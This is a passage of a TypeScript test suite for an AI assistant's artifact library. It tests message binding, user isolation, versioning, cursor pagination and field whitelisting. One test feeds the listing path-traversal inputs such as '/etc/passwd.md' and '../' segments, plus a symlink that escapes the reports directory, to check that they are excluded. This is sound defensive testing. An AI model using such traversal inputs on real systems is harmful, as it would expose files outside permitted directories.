    userId,
    instanceId,
    relativePath: "reports/metrics/bind-flow.svg",
    scope: { projectId: "invest-agent", assistantId: userId, conversationId },
  });
  markTurnEnd({ userId, instanceId, conversationId, turnId });
  assert.equal(record.turnId, turnId);
  assert.equal(record.previewMode, "image");

  // Mirror what conversation-log does when the assistant reply lands: the
  // artifact is stamped with the assistant message id and then surfaced as
  // the message's metadata.artifacts descriptors.
  const assistantMessageId = "msg-assistant-svg";
  const bindResult = mod.bindArtifactsToAssistantMessageForTest({
    userId,
    instanceId,
    conversationId,
    assistantMessageId,
    turnId,
  });
  assert.equal(bindResult.attached, 1);

  const messageArtifacts = mod.findArtifactsForMessage({ userId, instanceId, conversationId, messageId: assistantMessageId });
  assert.equal(messageArtifacts.length, 1);
  assert.equal(messageArtifacts[0].artifactId, record.artifactId);
  assert.equal(messageArtifacts[0].mimeType, "image/svg+xml");
  assert.equal(messageArtifacts[0].previewMode, "image");
  assert.equal(messageArtifacts[0].checksum, record.checksum);
});

// --- artifact.library.list curated listing ---------------------------------

async function createLibraryUser(ctx: TestContext, userId: string): Promise<string> {
  const workspace = path.join(ctx.workspaceRoot, userId);
  await mkdir(path.join(workspace, "reports", "daily"), { recursive: true });
  return workspace;
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function publishLibraryMarkdown(
  ctx: TestContext,
  input: {
    userId: string;
    instanceId: string;
    relativePath: string;
    content?: string;
    source?: "artifacts.publish" | "reviews.save" | "legacy_path";
  },
): Promise<ArtifactModuleType.ConversationArtifactRecord> {
  const workspace = path.join(ctx.workspaceRoot, input.userId);
  const target = path.join(workspace, input.relativePath);
  await mkdir(path.dirname(target), { recursive: true });
  await writeFile(target, input.content ?? `# ${input.relativePath}\n`);
  return ctx.mod.publishConversationArtifact({
    userId: input.userId,
    instanceId: input.instanceId,
    relativePath: input.relativePath,
    scope: {
      projectId: "invest-agent",
      assistantId: input.instanceId,
      source: input.source ?? "artifacts.publish",
    },
  });
}

/** Inserts a row that publish would have rejected, to test list-time curation. */
function insertLibraryRow(
  ctx: TestContext,
  input: {
    userId: string;
    instanceId: string;
    artifactId: string;
    relativePath: string;
    fileName?: string;
    source?: string;
    previewMode?: string;
    mimeType?: string;
    updatedAt?: string;
  },
): void {
  const now = new Date().toISOString();
  ctx.sqlite
    .prepare(
      `INSERT INTO conversation_artifacts (
         artifact_id, user_id, instance_id, assistant_id, source, kind,
         preview_mode, title, file_name, mime_type, relative_path, size_bytes,
         created_at, updated_at
       ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
    )
    .run(
      input.artifactId,
      input.userId,
      input.instanceId,
      input.instanceId,
      input.source ?? "artifacts.publish",
      "report",
      input.previewMode ?? "markdown",
      input.fileName ?? input.relativePath.split("/").pop() ?? "row.md",
      input.fileName ?? input.relativePath.split("/").pop() ?? "row.md",
      input.mimeType ?? "text/markdown",
      input.relativePath,
      10,
      now,
      input.updatedAt ?? now,
    );
}

test("library list isolates artifacts by user and instance", async () => {
  const ctx = await getCtx();
  await createLibraryUser(ctx, "lib-iso-a");
  await createLibraryUser(ctx, "lib-iso-b");
  const mine = await publishLibraryMarkdown(ctx, {
    userId: "lib-iso-a",
    instanceId: "inst-1",
    relativePath: "reports/daily/mine.md",
  });
  await publishLibraryMarkdown(ctx, {
    userId: "lib-iso-a",
    instanceId: "inst-2",
    relativePath: "reports/daily/other-instance.md",
  });
  await publishLibraryMarkdown(ctx, {
    userId: "lib-iso-b",
    instanceId: "inst-1",
    relativePath: "reports/daily/other-user.md",
  });

  const result = await ctx.mod.listCuratedArtifactLibrary({ userId: "lib-iso-a", instanceId: "inst-1" });
  assert.deepEqual(result.items.map((item) => item.artifactId), [mine.artifactId]);
});

test("library list admits images, pdf, text and table as downloadable/lightbox items but never legacy", async () => {
  const ctx = await getCtx();
  await createLibraryUser(ctx, "lib-excl");
  const userId = "lib-excl";
  const instanceId = "lib-excl";
  const scope = { projectId: "invest-agent", assistantId: instanceId };

  const validPublish = await publishLibraryMarkdown(ctx, { userId, instanceId, relativePath: "reports/daily/valid.md" });
  const validReview = await publishLibraryMarkdown(ctx, {
    userId,
    instanceId,
    relativePath: "reports/daily/review.md",
    source: "reviews.save",
  });
  const legacy = await publishLibraryMarkdown(ctx, { userId, instanceId, relativePath: "reports/daily/legacy.md", source: "legacy_path" });

  const workspace = path.join(ctx.workspaceRoot, userId);
  const svgTarget = path.join(workspace, "reports", "daily", "chart.svg");
  await writeFile(svgTarget, VALID_SVG);
  const svg = await ctx.mod.publishConversationArtifact({ userId, instanceId, relativePath: "reports/daily/chart.svg", scope });

  const pdfTarget = path.join(workspace, "reports", "daily", "doc.pdf");
  await writeFile(pdfTarget, Buffer.from("%PDF-1.4\n1 0 obj<<>>endobj\n"));
  const pdf = await ctx.mod.publishConversationArtifact({ userId, instanceId, relativePath: "reports/daily/doc.pdf", scope });

  const txtTarget = path.join(workspace, "reports", "daily", "notes.txt");
  await writeFile(txtTarget, "plain text");
  const txt = await ctx.mod.publishConversationArtifact({ userId, instanceId, relativePath: "reports/daily/notes.txt", scope });

  const csvTarget = path.join(workspace, "reports", "daily", "table.csv");
  await writeFile(csvTarget, "a,b\n1,2\n");
  const csv = await ctx.mod.publishConversationArtifact({ userId, instanceId, relativePath: "reports/daily/table.csv", scope });

  const result = await ctx.mod.listCuratedArtifactLibrary({ userId, instanceId });
  const ids = result.items.map((item) => item.artifactId).sort();
  // Legacy path is the only excluded type now.
  assert.ok(!ids.includes(legacy.artifactId), "legacy_path artifact must not appear in the library");
  assert.deepEqual(ids, [validPublish.artifactId, validReview.artifactId, svg.artifactId, pdf.artifactId, txt.artifactId, csv.artifactId].sort());

  const byId = new Map(result.items.map((item) => [item.artifactId, item]));
  // Markdown documents open in a tab and are not downloadable.
  assert.equal(byId.get(validPublish.artifactId)!.openRoute, "document");
  assert.equal(byId.get(validPublish.artifactId)!.downloadable, false);
  // Images route to the Lightbox, not a document tab.
  assert.equal(byId.get(svg.artifactId)!.openRoute, "image");
  assert.equal(byId.get(svg.artifactId)!.downloadable, false);
  assert.equal(byId.get(svg.artifactId)!.previewMode, "image");
  // PDF / TXT / CSV are download-only — no new previewer is added.
  assert.equal(byId.get(pdf.artifactId)!.openRoute, "download");
  assert.equal(byId.get(pdf.artifactId)!.downloadable, true);
  assert.equal(byId.get(txt.artifactId)!.openRoute, "download");
  assert.equal(byId.get(csv.artifactId)!.openRoute, "download");
});

test("library list excludes non-reports, absolute, traversal, hidden and temp/backup paths", async () => {
  const ctx = await getCtx();
  await createLibraryUser(ctx, "lib-paths");
  const valid = await publishLibraryMarkdown(ctx, {
    userId: "lib-paths",
    instanceId: "lib-paths",
    relativePath: "reports/daily/valid.md",
  });

  const badPaths = [
    "docs/outside.md", // outside reports
    "/etc/passwd.md", // absolute path
    "reports/../reports/evil.md", // parent traversal
    "reports/daily/.hidden.md", // hidden file name
    "reports/.secret/notes.md", // hidden directory segment
    "reports/daily/.#lock.md", // editor lock file
    "reports/daily/notes~", // backup suffix
    "reports/daily/scratch.tmp",
    "reports/daily/scratch.TEMP", // suffix match is case-insensitive
    "reports/daily/scratch.bak",
    "reports/daily/scratch.swp",
  ];
  badPaths.forEach((relativePath, index) =>
    insertLibraryRow(ctx, {
      userId: "lib-paths",
      instanceId: "lib-paths",
      artifactId: `art_bad_${index}`,
      relativePath,
    }),
  );

  const result = await ctx.mod.listCuratedArtifactLibrary({ userId: "lib-paths", instanceId: "lib-paths" });
  assert.deepEqual(result.items.map((item) => item.artifactId), [valid.artifactId]);
});

test("library list excludes artifacts whose file escapes the reports root via symlink", async () => {
  const ctx = await getCtx();
  const workspace = await createLibraryUser(ctx, "lib-sym");
  const outside = path.join(ctx.root, "lib-sym-outside.md");
  await writeFile(outside, "# escaped");
  await symlink(outside, path.join(workspace, "reports", "daily", "escape.md"));
  insertLibraryRow(ctx, {
    userId: "lib-sym",
    instanceId: "lib-sym",
    artifactId: "art_sym_escape",
    relativePath: "reports/daily/escape.md",
  });
  const valid = await publishLibraryMarkdown(ctx, {
    userId: "lib-sym",
    instanceId: "lib-sym",
    relativePath: "reports/daily/ok.md",
  });

  const result = await ctx.mod.listCuratedArtifactLibrary({ userId: "lib-sym", instanceId: "lib-sym" });
  assert.deepEqual(result.items.map((item) => item.artifactId), [valid.artifactId]);
});

test("library list keeps the newest valid formal version per path and never falls back to legacy", async () => {
  const ctx = await getCtx();
  const workspace = await createLibraryUser(ctx, "lib-ver");
  const userId = "lib-ver";
  const instanceId = "lib-ver";

  await publishLibraryMarkdown(ctx, { userId, instanceId, relativePath: "reports/daily/report.md", content: "v1" });
  await sleep(5);
  const v2 = await publishLibraryMarkdown(ctx, { userId, instanceId, relativePath: "reports/daily/report.md", content: "v2" });

  let result = await ctx.mod.listCuratedArtifactLibrary({ userId, instanceId });
  assert.deepEqual(result.items.map((item) => item.artifactId), [v2.artifactId]);

  // A legacy re-publish of the same path is the newest record, but legacy
  // sources never enter the tree: the listing falls back to the newest
  // still-valid formal version (v2), not to the legacy record.
  await sleep(5);
  const legacy = await publishLibraryMarkdown(ctx, {
    userId,
    instanceId,
    relativePath: "reports/daily/report.md",
    content: "v2",
    source: "legacy_path",
  });
  result = await ctx.mod.listCuratedArtifactLibrary({ userId, instanceId });
  assert.deepEqual(result.items.map((item) => item.artifactId), [v2.artifactId]);
  assert.notEqual(result.items[0].artifactId, legacy.artifactId);

  // A path whose only record is legacy never appears at all.
  await publishLibraryMarkdown(ctx, {
    userId,
    instanceId,
    relativePath: "reports/daily/only-legacy.md",
    source: "legacy_path",
  });
  result = await ctx.mod.listCuratedArtifactLibrary({ userId, instanceId });
  assert.deepEqual(result.items.map((item) => item.artifactId), [v2.artifactId]);

  // Once the file disappears, every version of the path is invalid and the
  // path drops out of the listing entirely.
  await unlink(path.join(workspace, "reports", "daily", "report.md"));
  result = await ctx.mod.listCuratedArtifactLibrary({ userId, instanceId });
  assert.deepEqual(result.items, []);
});

test("library list paginates with an opaque cursor without duplicates or gaps", async () => {
  const ctx = await getCtx();
  await createLibraryUser(ctx, "lib-page");
  const userId = "lib-page";
  const instanceId = "lib-page";
  const published: ArtifactModuleType.ConversationArtifactRecord[] = [];
  for (let index = 0; index < 5; index += 1) {
    published.push(
      await publishLibraryMarkdown(ctx, { userId, instanceId, relativePath: `reports/daily/page-${index}.md` }),
    );
    await sleep(5);
  }

  const seen: string[] = [];
  const pageSizes: number[] = [];
  let cursor: string | undefined;
  do {
    const page = await ctx.mod.listCuratedArtifactLibrary({ userId, instanceId, cursor, limit: 2 });
    pageSizes.push(page.items.length);
    seen.push(...page.items.map((item) => item.artifactId));
    cursor = page.nextCursor;
  } while (cursor);

  assert.deepEqual(pageSizes, [2, 2, 1]);
  assert.equal(new Set(seen).size, 5);
  assert.deepEqual([...seen].sort(), published.map((record) => record.artifactId).sort());

  // Page order must follow the (updated_at DESC, artifact_id DESC) keyset.
  const expectedOrder = (
    ctx.sqlite
      .prepare(
        `SELECT artifact_id AS artifactId FROM conversation_artifacts
         WHERE user_id = ? AND instance_id = ?
         ORDER BY updated_at DESC, artifact_id DESC`
      )
      .all(userId, instanceId) as Array<{ artifactId: string }>
  ).map((row) => row.artifactId);
  assert.deepEqual(seen, expectedOrder);

  // Oversized limits are clamped, not rejected.
  const all = await ctx.mod.listCuratedArtifactLibrary({ userId, instanceId, limit: 100000 });
  assert.equal(all.items.length, 5);
  assert.equal(all.nextCursor, undefined);
});

test("library list rejects malformed cursors with a deterministic error", async () => {
  const ctx = await getCtx();
  await createLibraryUser(ctx, "lib-cursor");
  await publishLibraryMarkdown(ctx, {
    userId: "lib-cursor",
    instanceId: "lib-cursor",
    relativePath: "reports/daily/doc.md",
  });

  const badCursors = [
    "not-a-cursor",
    Buffer.from("[]", "utf8").toString("base64url"),
    Buffer.from("{}", "utf8").toString("base64url"),
    Buffer.from(JSON.stringify({ u: 1, a: "x" }), "utf8").toString("base64url"),
  ];
  for (const cursor of badCursors) {
    await assert.rejects(
      () => ctx.mod.listCuratedArtifactLibrary({ userId: "lib-cursor", instanceId: "lib-cursor", cursor }),
      (error: unknown) => expectErrorCode(error, "ARTIFACT_INVALID_CURSOR"),
    );
  }
});

test("library list returns only whitelisted descriptor fields and records one aggregate audit event", async () => {
  const ctx = await getCtx();
  await createLibraryUser(ctx, "lib-fields");
  await publishLibraryMarkdown(ctx, {
    userId: "lib-fields",
    instanceId: "lib-fields",
    relativePath: "reports/daily/fields.md",
  });

  const result = await ctx.mod.listCuratedArtifactLibrary({ userId: "lib-fields", instanceId: "lib-fields" });
  assert.equal(result.items.length, 1);
  const item = result.items[0];
  assert.deepEqual(
    Object.keys(item).sort(),
    [
      "artifactId",
      "category",
      "checksum",
      "createdAt",
      "directorySegments",
      "displayPath",
      "downloadable",
      "fileName",
      "mimeType",
      "openRoute",
      "previewMode",
      "sizeBytes",
      "title",
      "updatedAt",
    ].sort(),
  );
  assert.equal(item.displayPath, "daily/fields.md");
  assert.deepEqual(item.directorySegments, ["daily"]);
  assert.ok(!item.displayPath.startsWith("reports/"));
  assert.ok(!path.isAbsolute(item.displayPath));
  assert.equal(item.mimeType, "text/markdown");
  assert.equal(item.previewMode, "markdown");
  // The list never ships file contents or internal scope fields.
  assert.ok(!("content" in item) && !("base64" in item));
  const serialized = JSON.stringify(result);
  assert.ok(!serialized.includes("lib-fields"));
  assert.ok(!serialized.includes(ctx.workspaceRoot));

  const events = ctx.sqlite
    .prepare("SELECT event, reason FROM conversation_artifact_events WHERE artifact_id = 'library.list' AND user_id = ?")
    .all("lib-fields") as Array<{ event: string; reason: string }>;
  assert.equal(events.length, 1);
  assert.equal(events[0].event, "library.list");
  assert.ok(events[0].reason.includes("count=1"));
});
